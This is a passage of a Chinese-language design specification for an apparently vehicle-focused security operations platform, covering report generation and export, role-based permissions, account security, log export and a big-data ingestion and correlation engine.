title="统计报表管理"></a>统计报表管理</h6><p>统计报表管理：对其他平台数据进行汇总、梳理、统计和分析，生成统一关联分析的报告。统计报表管理是一个重要的数据管理和分析工作，特别是当涉及到多个平台的数据时。以下是设计方案的一般步骤。</p><ul><li>需求分析，确定业务需求：了解用户需要什么样的报表和分析。</li><li>确定数据来源，明确要汇总的平台，了解每个平台的数据结构和特点。</li><li>标准化数据格式，确保不同平台的数据可以被统一处理，可能需要进行数据清洗和转换。</li><li>制定数据收集计划，确保数据按照一定的时间周期或事件触发进行采集。</li><li>数据存储，设计数据库结构：创建数据库，用于存储各平台的数据。</li><li>实施ETL（抽取、转换、加载）过程：将数据从不同平台提取、转换为目标格式，然后加载到数据库中。</li><li>统计和分析，选择合适的统计工具：例如，使用SQL查询语言、数据可视化工具（如Tableau、Power BI）等。</li><li>制定统计规则和算法：确定如何汇总和计算数据，包括计算平均值、总和、百分比等。</li><li>设计报表模板，根据业务需求设计报表的结构和样式。</li><li>自动化报表生成，使用脚本或工作流程自动化生成报表，确保报表及时准确。</li><li>关联分析：进行数据关联，通过共同的字段将不同平台的数据关联起来。</li></ul><h6 id="报表统计与导出模块"><a href="#报表统计与导出模块" class="headerlink" title="报表统计与导出模块"></a>报表统计与导出模块</h6><p>报表统计：系统提供日报、月报、季报、年报等报表统计功能。报表内容至少包括车辆、事件、工单等相关信息，以便用户进行风险分析和管理。具体设计如下。</p><ul><li>数据模型设计：设计包含车辆、事件、工单等相关信息的数据库表结构。确定表之间的关联关系，以便能够联合查询各种信息。</li><li>报表生成模块：实现日报、月报、季报、年报等报表的生成模块。</li></ul><p>使用合适的统计算法和查询语句，确保生成的报表反映出车辆、事件、工单等的相关信息。</p><ul><li>报表展示界面：设计用户友好的报表展示界面，支持用户根据需要选择报表类型和时间范围。</li></ul><p>报表导出：系统支持将报表导出为PDF、Excel、Word等格式，用户可以选择导出的格式，并支持自定义报表模板，包括LOGO等操作，以满足个性化需求和品牌展示。具体设计如下。</p><ul><li>导出格式支持模块：使用现有的导出库或API，如pdfkit（用于PDF）、xlsx（用于Excel）、docx（用于Word）等，以实现将报表导出为不同格式。提供用户界面选项，让用户能够选择导出的格式，例如通过下拉菜单或单选按钮。</li><li>自定义报表模板模块：提供报表模板编辑功能，允许用户上传公司LOGO和其他品牌展示元素。使用适当的模板引擎，以在报表中嵌入用户上传的LOGO和其他自定义信息。允许用户调整报表的排版、字体、颜色等，以满足个性化需求。</li><li>用户界面设计：在用户界面上创建一个“导出设置”或类似的页面，供用户进行导出格式和模板的选择。提供实时预览功能，让用户在选择不同的导出格式和调整模板设置时能够即时查看报表的外观。</li><li>后端服务：创建后端服务来处理用户的导出请求，包括生成报表、嵌入LOGO和其他信息，最终将报表以用户选择的格式导出。确保后端服务能够处理不同格式的报表生成，并提供合适的接口供前端调用。</li><li>文件上传和管理：实现文件上传功能，以便用户能够上传公司LOGO和其他自定义元素。在后端存储这些上传的文件，确保它们能够在生成报表时被正确引用。</li></ul><h6 id="权限划分模块"><a href="#权限划分模块" class="headerlink" title="权限划分模块"></a>权限划分模块</h6><p>统计报表模块应有明确的权限划分：系统支持对统计报表模块进行权限管理，以确保只有授权用户可以访问和操作报表功能。不同用户角色可以被分配不同的权限，以控制其对报表的查看、生成和导出等操作。具体设计如下。</p><ul><li>用户角色定义：</li></ul><p>管理员角色： 具有最高权限，可以访问、查看、生成和导出所有报表。能够管理用户角色和权限设置。</p><p>普通用户角色： 具有一般的查看报表权限，可以生成和导出报表，但不能进行系统的权限管理操作。</p><ul><li>权限分配：</li></ul><p>报表查看权限： 允许用户查看已有的报表，但不能进行生成和导出操作。</p><p>报表生成权限： 允许用户生成报表，但不能导出。</p><p>报表导出权限： 允许用户将报表导出为PDF、Excel、Word等格式。</p><ul><li>报表管理页面：创建一个专门的报表管理页面，供管理员进行权限设置。在报表管理页面上，管理员可以查看所有用户的权限情况，并进行相应的修改。</li><li>权限验证：在系统的后端服务中实施权限验证机制，确保用户只能执行其被授权的操作。对于前端界面，实现动态渲染，只显示用户有权限进行的操作。</li><li>安全性考虑：使用安全的身份验证机制，如OAuth、JWT等，以确保用户身份的安全性。对敏感操作和数据进行加密，确保数据的保密性。</li><li>审计日志：记录用户的操作日志，包括登录、查看报表、生成报表、导出报表等。这些审计日志可以用于事后审计，追踪用户的操作历史。</li><li>定期审查和更新：定期审查用户的权限设置，确保其仍然符合组织的安全策略。在系统和业务变更后，及时更新权限设置，以适应新的需求和安全标准。</li></ul><h6 id="默认报表与报表周期模块"><a href="#默认报表与报表周期模块" class="headerlink" title="默认报表与报表周期模块"></a>默认报表与报表周期模块</h6><p>提供默认报表：系统提供默认的报表模板，包括日报、周报、月报、季报和年报。这些报表模板将包含车辆、事件、工单等相关信息，以满足基本的报表需求。具体设计如下。</p><ul><li>日报： 包括当天的车辆、事件、工单等相关信息的汇总。</li><li>周报： 汇总本周的车辆、事件、工单等信息，可能包含趋势和统计数据。</li><li>月报： 提供当月车辆、事件、工单等的详细信息，可能包括月度总结和分析。</li><li>季报： 汇总季度内的车辆、事件、工单等信息，包含季度度趋势和关键数据。</li><li>年报： 提供全年的车辆、事件、工单等信息，可能包含年度总结、趋势和关键指标。</li></ul><h6 id="报表生成与导出模块"><a href="#报表生成与导出模块" class="headerlink" title="报表生成与导出模块"></a>报表生成与导出模块</h6><p>报表生成与导出：系统支持生成日报、周报、月报、季报和年报等不同周期的报表。用户可以选择报表模板，并根据需要自定义报表时间范围。生成的报表可以以PDF、Word、HTML等格式进行下载和导出。此外，系统还支持通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信等方式通知指定责任人。具体设计如下。</p><ul><li>多格式导出功能模块：实现对报表生成结果的多格式导出功能，包括PDF、Word、HTML等。集成相应的导出库，如pdfkit、python-docx等。</li><li>用户界面设计：在报表展示页面提供导出按钮，允许用户选择导出的格式。提供下载链接或直接在页面上预览并下载生成的报表文件。</li><li>异常通知和重试机制：实施异常通知和重试机制，以确保在通知发送失败时系统能够自动重试或者通知相关责任人。</li><li>通知方式集成模块：集成不同通知方式的API或SDK，如邮件发送、短信服务商API、企业微信API、消息中心API、企业钉钉API、蓝信API等。</li><li>触发通知的触发器：在系统中设置触发器，根据预定条件触发通知，例如报表生成完成、重要事件发生等。确保通知触发器与系统的事件和任务处理机制集成。</li></ul><h6 id="报表展示形式与扩展字段模块"><a href="#报表展示形式与扩展字段模块" class="headerlink" title="报表展示形式与扩展字段模块"></a>报表展示形式与扩展字段模块</h6><p>报表展示形式选择：系统支持不同的展示形式，如柱状图、折线图、饼图等，以便用户根据需求选择最合适的展示方式。</p><p>扩展字段内容：系统支持扩展字段内容，例如车型、零部件等。用户可以在报表中添加这些扩展字段，以提供更详细和全面的报表信息。具体设计如下。</p><ul><li>图表库集成：集成现代图表库，如Chart.js、Highcharts等，以支持不同的图表类型，包括柱状图、折线图、饼图等。</li><li>用户界面设计：在报表展示页面提供图表类型选择器，允许用户根据需求选择最合适的图表形式。通过下拉菜单或其他交互方式，让用户能够灵活切换图表类型。</li><li>动态图表生成：根据用户选择的图表类型，动态生成相应的图表，并在页面上展示。考虑使用异步加载机制，以提高页面加载速度和用户体验。</li><li>扩展字段模型设计：设计支持扩展字段的数据库模型，确保系统能够存储和检索扩展字段相关的数据。考虑使用键值对或其他灵活的数据结构，以容纳不同类型的扩展字段。</li><li>用户界面扩展字段设置：在系统中创建一个扩展字段设置页面，允许管理员配置可用的扩展字段。允许管理员为每个扩展字段定义名称、类型、显示顺序等属性。</li><li>报表字段选择和过滤：在报表生成页面提供一个字段选择器，允许用户选择添加扩展字段到报表中。提供过滤功能，允许用户按照扩展字段进行筛选和排序。</li></ul><h6 id="报表导出格式模块"><a href="#报表导出格式模块" class="headerlink" title="报表导出格式模块"></a>报表导出格式模块</h6><p>报表导出格式：系统支持将报表导出为PDF、Excel、Word等格式。用户可以根据需要选择合适的导出格式，以便在不同场景下使用和分享报表数据。具体设计如下。</p><ul><li>导出库集成：集成现有的导出库，如pdfkit（用于PDF）、xlsx（用于Excel）、docx（用于Word）等，以实现将报表导出为不同格式。</li><li>用户界面设计：在报表展示页面或报表管理页面上，提供导出按钮或选项，让用户能够选择导出的格式。提供下拉菜单或单选按钮等交互元素，让用户灵活选择导出格式。</li><li>导出设置：允许用户设置导出参数，如页面尺寸、边距、字体等，以满足个性化需求。提供高级选项，如图表是否包含图例、是否包含表格边框等。</li></ul><h4 id="系统管理-1"><a href="#系统管理-1" class="headerlink" title="系统管理"></a>系统管理</h4><h5 id="功能实施方案-53"><a href="#功能实施方案-53" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>平台将所有数据进行集中处理、分析及存储，确保数据的一致性和完整性，同时也便于进行全面的数据管理和分析，为用户提供准确的数据支持。</p><p>为了满足用户对数据检索的复杂需求，系统提供了多种筛选条件，并支持这些条件的灵活组合，如车型、零部件、风险类型、风险等级等，使用户能够根据具体需求快速定位所需数据。</p><p>系统支持有权限的用户进行日志导出，这些日志包含但不限于风险事件的等级、类型、状态，以及关联的资产信息、资产IP等重要信息，这样的功能对于数据分析和安全审计至关重要。</p><p>除了基本的筛选条件，系统还提供更多可灵活搭配的筛选条件，如源IP等，进一步增强了用户筛选数据的能力，使得数据检索更加精确。</p><p>系统支持使用多种逻辑运算和关系运算进行复杂搜索语句的构造，运算符包括等于、不等于、大于、小于、模糊匹配、不匹配等，提供前台页面方面用户选择组合逻辑运算条件，通过多种逻辑运算的组合查询，用户可以快速从索引类型和字段列表中筛选出日志源和关键字段，形成搜索条件，大大提升搜索的灵活性和准确度。</p><p>系统支持从索引类型和字段列表中快速筛选出日志源和关键字段，用户可以依此形成精确的搜索条件，提升检索效率。</p><p>系统允许对角色进行有效且可控的管理，包括编辑、新增、删除和查看功能，帮助用户实现对于角色的创建、调整、删除等管理，确保角色管理的灵活性和安全性。</p><p>具备强大的系统账户安全性验证机制。这包括但不限于双因子认证，通过短信、邮件或第三方认证服务提供商提供的动态令牌等方式进行二次验证，确保账户登录的安全性。此外，还应提供账户登录设置功能，允许管理员设置账户登录的限制条件，如登录失败次数、登录地理位置等。同时，可信主机功能可以帮助识别和限制来自可疑IP或域名的登录请求，进一步提高账户安全。为了应对复杂的网络威胁，平台还应支持对登录异常账户的锁定功能，一旦检测到异常登录行为，可以立即锁定账户以防止进一步损失。对于账户密码，应支持自定义密码长度和强度的设置，要求用户设置足够长且复杂的密码以提高安全性。对于同一账户的多个登录会话，平台应支持会话并发数的限制，以防止暴力破解等攻击。</p><p>提供完善的用户角色管理功能。通过创建不同的角色，如管理员、普通用户、分析师等，平台能够为每个角色分配特定的系统功能模块和数据访问权限。例如，管理员角色可以拥有对所有功能模块的访问权限，而普通用户可能只被允许查看部分数据或执行某些特定的操作。通过这种方式，平台能够实现精细的权限控制，确保不同用户只能访问其被授权的数据和功能模块。同时，根据组织结构和业务需求的变化，管理员还可以灵活地修改和更新角色权限，以满足不断变化的业务需求。</p><p>支持角色权限控制，通过创建角色，并赋予角色不同功能模块的权限，系统可以精细化管理用户权限，以适应不同用户的工作需求。</p><p>提供系统日志功能，系统日志功能记录了当前账户的所有操作行为，为系统安全和用户行为分析提供了可靠的数据支持。</p><p>账户管理功能由超级管理员操作，超级管理员可以创建不同角色和权限级别的账户，并根据组织结构和业务需求进行灵活配置。通过超级管理员账户，组织可以方便地进行账户管理和权限配置，确保每个账户具有适当的访问权限且相互之间不会造成干扰或安全隐患。此外，超级管理员能够管理和监控整个系统的运行状况，及时处理各类问题和故障，确保平台的稳定性和可用性。</p><p>在账户管理中，提供详细的账户信息展示功能。这些信息应包括用户名、手机号、部门、所属权限、姓名和创建时间等关键字段。通过这些信息，管理员可以快速了解账户的基本情况和所属关系，方便进行账户管理和权限配置。同时，这些信息也有助于及时发现潜在的安全风险或异常行为。</p><p>支持超级管理员功能，系统的超级管理员，他们拥有对平台账号进行全面维护的能力，确保账户的安全性和有效性。</p><h5 id="技术实现内容-46"><a href="#技术实现内容-46" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h6><p>用户管理：管理系统用户的权限和身份验证。具体设计如下。</p><ul><li>用户身份验证：</li></ul><p>用户注册：提供用户注册页面，允许新用户注册账户。要求用户提供必要的信息，如用户名、密码、电子邮件地址等。</p><p>用户登录：提供用户登录页面，用户使用注册时提供的用户名和密码进行身份验证。考虑使用安全的身份验证机制，如哈希密码存储、加盐等。</p><p>密码重置：提供密码重置功能，允许用户通过电子邮件或手机短信进行密码重置。</p><ul><li>用户权限管理：</li></ul><p>角色定义：定义不同的用户角色，例如管理员、普通用户等。为每个角色分配相应的权限。</p><p>权限分配：提供管理员界面，允许管理员为用户分配角色和权限。</p><p>确保灵活性，允许用户拥有不同的角色组合。</p><p>权限验证：在系统的核心功能中嵌入权限验证逻辑，确保用户只能访问其被授权的资源和操作。</p><h6 id="数据处理、分析与存储模块"><a href="#数据处理、分析与存储模块" class="headerlink" title="数据处理、分析与存储模块"></a>数据处理、分析与存储模块</h6><p>集中处理、分析及存储：系统能够集中处理、分析和存储所有平台数据，确保数据的一致性和完整性。具体设计如下。</p><ul><li>数据集成和处理：</li></ul><p>数据集成模块：实现数据集成模块，负责从不同平台收集数据并将其整合到一个中心数据仓库中。</p><p>数据清洗和验证：在数据集成过程中进行数据清洗，处理重复、缺失或错误的数据。引入数据验证机制，确保数据符合预期的格式和规范。</p><p>实时数据流：如果系统需要实时处理数据，考虑使用实时数据流技术，确保数据的及时性。</p><ul><li>数据存储和管理：</li></ul><p>中心数据仓库：设计和建立一个中心化的数据仓库，存储从各个平台集成而来的数据。使用合适的数据库技术，如关系型数据库MySQL</p><p>数据备份和恢复：实施定期的数据备份策略，确保系统中的数据可以在意外情况下进行恢复。定期测试备份和恢复流程，以确保备份的有效性。</p><h6 id="筛选条件与灵活组合模块"><a href="#筛选条件与灵活组合模块" class="headerlink" title="筛选条件与灵活组合模块"></a>筛选条件与灵活组合模块</h6><p>多种筛选条件支持：系统提供多种筛选条件，如车型、零部件、风险类型、风险等级等，用户可以灵活组合这些条件进行数据筛选。具体设计如下。</p><ul><li>条件定义：定义系统支持的各种筛选条件，例如车型、零部件、风险类型、风险等级等。每个筛选条件需要有明确的定义、名称和可能的取值范围。</li><li>条件分类：将筛选条件进行分类，以方便用户在界面上进行选择和组合。可以按照车辆信息、风险信息等分类。</li></ul><h6 id="日志导出权限设置"><a href="#日志导出权限设置" class="headerlink" title="日志导出权限设置"></a>日志导出权限设置</h6><p>日志导出权限设置是一项功能，允许具有相应权限的用户进行日志的导出操作。该功能允许管理员或特定角色的用户根据需要选择导出的日志内容，并设置导出的条件和筛选器。用户可以根据风险事件的等级、类型、状态以及关联资产信息进行筛选，并选择需要导出的字段，如资产IP等。</p><p>通过日志导出权限设置，管理员可以灵活地控制哪些用户可以导出日志，并限制他们的访问范围。这样可以确保敏感信息的安全性和机密性。只有具有权限的用户才能进行日志导出操作，从而保证了数据的安全性和合规性。</p><p>此外，日志导出权限设置还可以根据用户的角色和职责进行细分和定制。不同角色的用户可以具备不同的导出权限，以满足组织内部的安全管理需求。这样可以确保只有经过授权的用户才能访问和导出特定类型的日志数据，提高了系统的安全性和可管理性。具体设计如下。</p><ul><li>角色权限定义：定义具有导出日志权限的用户角色，如管理员或其他特定角色。将日志导出权限与其他系统权限进行合理的划分。</li><li>权限控制模块：实现权限控制模块，确保只有具有导出日志权限的用户可以访问相关功能。</li><li>筛选条件选择：导出设置页面上提供筛选条件，包括风险事件的等级、类型、状态以及关联资产信息。使用直观的界面元素，如下拉菜单、多选框等，以便用户能够选择导出条件。</li><li>字段选择器：提供字段选择器，让用户可以根据需要选择导出的字段，如资产IP、风险等级、事件类型等。可以使用拖拽或列表选择的方式，以方便用户操作。</li><li>数据导出：将查询结果导出为用户选择的格式，如Excel等。实现异步导出，避免导出大量数据时对系统性能的影响。</li><li>日志记录：记录导出操作的日志，包括执行导出的用户、导出时间、导出条件等关键信息。确保记录足够的信息，以便进行审计和监控。</li></ul><h6 id="筛选条件扩展模块"><a href="#筛选条件扩展模块" class="headerlink" title="筛选条件扩展模块"></a>筛选条件扩展模块</h6><p>更多灵活搭配的筛选条件：系统支持更多可灵活搭配的筛选条件，如源IP等，以满足用户对数据的更精细筛选需求。具体设计如下。</p><ul><li>新增筛选条件：在系统中新增可灵活搭配的筛选条件，如源IP、目标IP等。确保每个新增的筛选条件都有清晰的定义和取值范围。</li><li>条件分类和组合：将新增的筛选条件进行分类，以便用户在筛选面板上进行选择和组合。允许用户在筛选面板上自由组合多个条件，以满足复杂的筛选需求。</li></ul><h6 id="复杂搜索语句构造模块"><a href="#复杂搜索语句构造模块" class="headerlink" title="复杂搜索语句构造模块"></a>复杂搜索语句构造模块</h6><p>复杂搜索语句构造：系统支持使用多种逻辑运算和关系运算进行复杂搜索语句的构造。用户可以使用等于、不等于、等于、小于、模糊匹配、不匹配等运算符，并从索引类型和字段列表中快速筛选出日志源和关键字段，形成搜索条件。具体设计如下。</p><ul><li>搜索条件编辑器：提供一个搜索条件编辑器，允许用户通过直观的界面构造复杂的搜索语句。使用类似于SQL的可视化编辑器，以方便用户选择字段、运算符和值。</li><li>逻辑运算：在编辑器中支持逻辑运算，如AND、OR、NOT，以便用户可以组合多个条件。提供括号或其他方式，使用户能够明确指定运算的优先级。</li><li>运算符选择器：在搜索条件编辑器中提供运算符选择器，允许用户选择等于、不等于、小于、大于、模糊匹配、不匹配等运算符。为每个运算符提供相应的帮助文档或提示，以帮助用户正确使用。</li><li>索引类型和字段列表：提供一个索引类型和字段列表，让用户能够从中快速筛选出日志源和关键字段。允许用户在搜索条件中选择特定的字段，并提供字段类型信息。</li></ul><h6 id="账户管理模块"><a href="#账户管理模块" class="headerlink" title="账户管理模块"></a>账户管理模块</h6><p>账户管理：系统提供账户管理功能，超级管理员可以创建不同角色、不同权限的账户。账户管理中需要包含用户名、手机号、部门、所属权限、姓名、创建时间等信息。具体设计如下。</p><ul><li>定义账户信息：设计账户信息模型，包括用户名、手机号、部门、所属权限、姓名、创建时间等字段。确保字段的准确性和完整性，可以考虑使用数据库关系模型。</li><li>角色和权限模型：定义角色模型和权限模型，以便将权限与账户关联。</li></ul><p>角色可以拥有多个权限，账户可以分配至一个或多个角色。</p><h6 id="账户安全性验证"><a href="#账户安全性验证" class="headerlink" title="账户安全性验证"></a>账户安全性验证</h6><p>账户安全性验证是一项重要的措施，用于保护系统账户的安全。</p><p>1. 双因子认证：双因子认证要求用户在登录时提供两个以上的验证因素，通常是密码和额外的身份验证方式，如手机验证码、指纹识别或硬件令牌等。这种方式提供了更高的安全性，即使密码被泄露，仍需要额外的验证因素才能成功登录。</p><p>2. 账户登录设置：账户登录设置允许用户对登录过程进行自定义配置。用户可以设置登录时的安全选项，如密码重置、安全问题、登录失败限制等。这样可以增加账户的安全性，并防止未经授权的访问。</p><p>3. 可信主机设置：可信主机设置允许用户指定特定的主机或设备作为可信任的登录来源。只有来自这些可信主机的登录请求才会被允许，其他来源的登录请求将被拒绝。这种设置可以防止未经授权的设备访问账户。</p><p>4. 异常账户锁定：系统可以监测登录行为，如果检测到异常的登录尝试，如多次失败的登录、异常的登录地点或IP地址变动等，可以自动锁定账户，防止恶意攻击者进一步尝试登录。</p><p>5. 密码策略设置：密码策略设置允许管理员定义密码的要求，如密码长度、密码强度要求（包括大小写字母、数字和特殊字符的使用）、密码过期时间等。这样可以确保用户设置的密码足够强壮，减少密码被破解的风险。</p><p>6. 登录会话并发数设置：登录会话并发数设置允许管理员限制同一账户的同时登录会话数量。通过设置最大并发数，可以防止恶意用户通过多个会话同时访问账户，提高账户的安全性。</p><p>这些账户安全性验证功能的组合可以有效地保护系统账户的安全，减少未经授权的访问和潜在的安全风险。管理员和用户可以根据实际需求进行配置和使用。</p><h6 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h6><p>日志管理：记录系统操作日志和安全事件日志。</p><p>系统日志模块</p><p>系统日志记录：系统记录当前账户的操作行为，包括登录、操作日志等，以便进行审计和追溯。具体设计如下。</p><ul><li>操作日志定义：定义系统中需要记录的操作日志，包括登录、关键操作（如账户管理、权限分配等）等。确保每个日志条目都包含足够的信息，如用户名、操作时间、IP地址、操作内容等。</li><li>日志级别：设计不同的日志级别，例如INFO、WARN、ERROR等，以便区分不同严重程度的日志记录。</li><li>数据库日志：将日志信息存储到数据库中，以便实现在线查询和分析。</li></ul><p>考虑使用合适的数据库表结构，以存储不同类型的日志信息。</p><ul><li><p>操作事件：记录关键操作的事件，例如账户管理、权限分配、系统设置变更等。记录操作的具体内容和相关参数。</p><p>日志导出模块</p></li></ul><p>有权限用户的日志导出：系统支持有权限的用户进行日志导出操作。导出的日志包含风险事件等级、类型、状态、关联资产信息、资产IP等相关信息。具体设计如下。</p><ul><li>.导出设置界面：</li></ul><p>选择导出条件：提供一个导出设置界面，允许用户选择导出的条件，包括风险事件等级、类型、状态等。使用直观的界面元素，如下拉菜单、多选框等。</p><p>字段选择器：提供字段选择器，让用户可以选择导出的字段，包括关联资产信息、资产IP等。允许用户根据需要定制导出的信息。</p><ul><li>导出操作处理：</li></ul><p>后端服务：在后端服务中实现导出操作的处理逻辑，根据用户设置的条件生成相应的查询语句。使用合适的数据库查询语言，如SQL，进行数据检索。</p><p>数据导出：将查询结果导出为用户选择的格式，如CSV、Excel等。</p><p>考虑实现异步导出，避免导出大量数据时对系统性能的影响。</p><h6 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h6><p>配置管理：管理系统的配置参数和设置。</p><p>角色管理与权限控制模块</p><p>有效可控的角色管理：系统支持对角色进行有效可控的管理，包括角色的编辑、新增、删除和查看等操作。</p><p>系统账户安全性验证：系统提供系统账户的安全性验证功能，包括双因子认证、账户登录设置、可信主机等设置。用户可以对登录异常账户进行锁定，设置密码长度、密码强度、登录会话并发数等安全设置。</p><p>用户角色管理：系统支持用户角色管理，管理员可以为不同角色赋予不同的系统功能模块和数据的读写权限。</p><p>创建角色与权限赋予：管理员可以通过创建角色，并为角色赋予不同功能模块的权限，实现对用户的权限管理。具体设计如下。</p><ul><li>角色定义：设计系统中需要的角色，如管理员、普通用户、审计员等。</li></ul><p>为每个角色定义具体的权限范围，包括系统功能模块和数据的读写权限。</p><p>提供管理员界面，允许管理员对角色进行编辑、新增、删除等操作。确保删除角色时处理好相关的用户关联关系，避免数据不一致。</p><ul><li>权限控制：在系统的各个模块中实现权限控制，确保只有具有相应权限的用户可以进行相关操作。4. 创建角色与权限赋予：</li><li>角色创建：提供管理员功能，允许管理员创建新的角色。在创建角色时，指定角色的名称和初始的权限范围。</li><li>权限赋予：在系统管理界面，允许管理员为每个角色赋予不同功能模块的权限。提供直观的权限赋予界面，以方便管理员进行设置。</li></ul><h4 id="大数据引擎"><a href="#大数据引擎" class="headerlink" title="大数据引擎"></a>大数据引擎</h4><h5 id="功能实施方案-54"><a href="#功能实施方案-54" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供的大数据引擎具备数据抽取策略与处理功能，支持从既有的大数据平台、平台安全防护引接TSP、OTA、PKI等数据，从漏洞管理平台和安全检测平台引接漏洞数据，制定数据抽取策略，完成抽取。同时，需对数据进行清洗、去重、补全等加工操作，确保数据的准确性和完整性。</p><p>提供的大数据引擎具备统一数据接口与归一化处理功能，平台能够提供统一的数据接口，实现数据的归一化处理操作。归一化处理包括数据的格式化、标准化等操作，确保不同来源的数据能够进行统一管理和分析。</p><p>提供的大数据引擎具备并发采集能力，支持基于大数据的数据并发采集能力，实现对支持并发数据采集接收。通过高效的并发采集技术，平台能够快速获取大量的安全数据，为后续的安全分析提供充足的数据支持，这保证了在大量数据涌入时，平台仍能高效地采集和处理数据。</p><p>提供的大数据引擎具备数据加工操作功能，数据在入仓之前，需经过一系列的加工操作，如格式化、去重、补全、标准化等。这些操作能够确保数据的准确性和完整性，为后续的数据分析和威胁情报生成提供可靠的基础。在必要时，平台还应具备对问题进行数据再清洗和过滤的能力，确保数据的可靠性和可用性。加工完成后的数据应被清洗并入仓存储，以供后续的分析和利用。这些操作旨在提高数据的处理效率，确保数据的准确性和一致性。</p><p>提供的大数据引擎具备关联分析与异常检测能力，基于大数据的关联分析功能，平台可实现基于日志发生频次、时间、地点、车辆的分析，以及对异常数据的发现。通过关联分析，可以深入挖掘数据之间的潜在联系，及时发现异常行为和威胁，为安全运营提供有力支持。</p><h5 id="技术实现内容-47"><a href="#技术实现内容-47" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="外部数据对接与抽取模块"><a href="#外部数据对接与抽取模块" class="headerlink" title="外部数据对接与抽取模块"></a>外部数据对接与抽取模块</h6><p>支持对接既有的大数据平台、态势感知平台、平台安全防护引接TSP、PKI等数据：系统能够与这些平台进行数据对接，并制定相应的数据抽取策略，完成数据的抽取操作。</p><p>引接漏洞数据：系统支持从漏洞管理平台和安全检测平台引接漏洞数据，确保漏洞信息的及时更新。具体设计如下。</p><ul><li>数据抽取策略制定：</li></ul><p>数据源分析：分析既有平台的数据源结构，了解数据的组织和存储方式。</p><p>增量同步：设计增量同步策略，以提高效率，减少重复数据传输</p><p>定时任务：实现定时任务，根据数据更新频率制定抽取计划，确保数据及时同步。</p><ul><li>引接漏洞数据：</li></ul><p>漏洞数据接口：与漏洞管理平台和安全检测平台建立标准化的接口，支持漏洞数据的引接。</p><p>定期同步：实现定期同步漏洞数据的机制，确保系统中的漏洞信息保持及时更新。</p><p>异常处理：考虑引入异常处理机制，及时处理数据同步中的异常情况，确保数据的完整性。</p><ul><li>安全性和合规性：</li></ul><p>加密传输：采用加密传输方式，保障敏感数据在传输过程中的安全性。</p><p>访问控制：在数据对接的接口层面实施访问控制，确保只有授权系统能够进行数据对接。</p><h6 id="统一数据接口与归一化处理模块"><a href="#统一数据接口与归一化处理模块" class="headerlink" title="统一数据接口与归一化处理模块"></a>统一数据接口与归一化处理模块</h6><p>统一数据接口：系统提供统一的数据接口，实现不同数据源的数据归一化处理，确保数据格式的一致性。具体设计如下。</p><ul><li>标准化格式：制定系统数据接口的标准格式，确保数据在传输和处理过程中具有一致的结构。</li><li>Restful API：是—种互联网软件架构的设计规范，设计指南，设计风格，设计原则(类似于web标准，并不是标准【规范，原则】)。</li><li>数据格式标准：使用通用的数据格式标准，如JSON或XML，以便在不同系统之间进行数据传递。</li><li>数据清洗：实施数据清洗机制，对不同数据源的数据进行清理，处理不一致的格式、命名规范等问题。</li></ul><h6 id="大数据并发采集模块"><a href="#大数据并发采集模块" class="headerlink" title="大数据并发采集模块"></a>大数据并发采集模块</h6><p>基于大数据的数据并发采集能力：系统具备基于大数据的数据并发采集能力，可以同时处理多个数据源的数据，提高数据采集的效率和速度。数据源包含既有的大数据平台、态势感知平台、平台安全防护引接TSP、OTA、PKI等数据，从漏洞管理平台和安全检测平台引接漏洞数据，制定数据抽取策略，完成抽取。具体设计如下。</p><ul><li>多数据源管理：</li></ul><p>数据源注册：允许管理员注册不同类型的数据源，包括大数据平台、态势感知平台、平台安全防护引接TSP、OTA、PKI等。</p><p>数据源配置：提供界面，使管理员能够配置每个数据源的连接信息、认证信息等。</p><p>动态扩展：考虑实现数据源的动态扩展机制，以便在系统运行时添加新的数据源。</p><ul><li>数据抽取策略：</li></ul><p>增量抽取：设计增量抽取策略，确保只有变化的数据被采集，以提高效率。</p><p>定时任务：实现定时任务系统，允许管理员制定数据抽取计划，按照预定的时间进行采集。</p><p>异常处理：引入异常处理机制，能够处理在数据抽取过程中可能出现的错误，确保采集的稳定性。</p><ul><li>引接漏洞数据：</li></ul><p>漏洞数据接口：与漏洞管理平台和安全检测平台建立异步接口，以提高漏洞数据的引接效率。</p><p>批量导入：实现批量导入机制，能够一次性导入多个漏洞数据，减少导入次数。</p><h6 id="数据加工与清洗模块"><a href="#数据加工与清洗模块" class="headerlink" title="数据加工与清洗模块"></a>数据加工与清洗模块</h6><p>数据加工操作：系统支持对数据进行格式化、去重、补全、标准化等加工操作，确保数据的质量和一致性。</p><p>再清洗与再过滤：系统在必要时可以对问题数据进行再清洗、再过滤，以确保数据的准确性和可用性，清洗完成后将数据入仓。具体设计如下。</p><ul><li>数据加工操作设计：</li></ul><p>格式化操作：提供格式化工具，支持对数据进行格式调整，确保数据的一致性和可读性。</p><p>去重处理：实现去重算法，能够识别并删除重复的数据，避免冗余信息对分析造成影响。</p><p>补全缺失值：设计缺失值补全策略，对数据中的缺失值进行合理的填充，以确保数据的完整性。</p><p>标准化处理：提供标准化工具，能够将数据转换为统一的标准格式，以适应系统的需求。</p><ul><li>再清洗与再过滤设计：</li></ul><p>异常数据检测：实现异常数据检测机制，能够识别出问题数据，例如不规范、异常值等。</p><p>再清洗操作：提供再清洗工具，允许用户对异常数据进行再次清洗，确保数据的准确性。</p><p>再过滤策略：制定再过滤策略，能够对不符合规范的数据进行再次过滤，确保数据的可用性。</p><h6 id="基于大数据的关联分析模块"><a href="#基于大数据的关联分析模块" class="headerlink" title="基于大数据的关联分析模块"></a>基于大数据的关联分析模块</h6><p>关联分析能力：系统支持基于大数据的关联分析，可以根据日志发生频次、时间、地点、车辆等因素进行分析，从中发现异常数据和潜在的安全威胁。具体设计如下。</p><ul><li>定义关联数据结构：制定关联数据模型，明确定义日志中需要用于关联分析的关键因素，如时间戳、地点、车辆标识等。</li><li>数据标准化：对各个数据字段进行标准化，确保数据格式的一致性，方便后续关联分析的处理。</li><li>时间序列分析：考虑使用时间序列分析方法，发现时间上的关联性，识别异常事件的发生规律。</li><li>地理空间分析：实施地理空间分析，识别在特定地点发生的异常事件，以进行地域性的关联分析。</li></ul><h4 id="大数据存储"><a href="#大数据存储" class="headerlink" 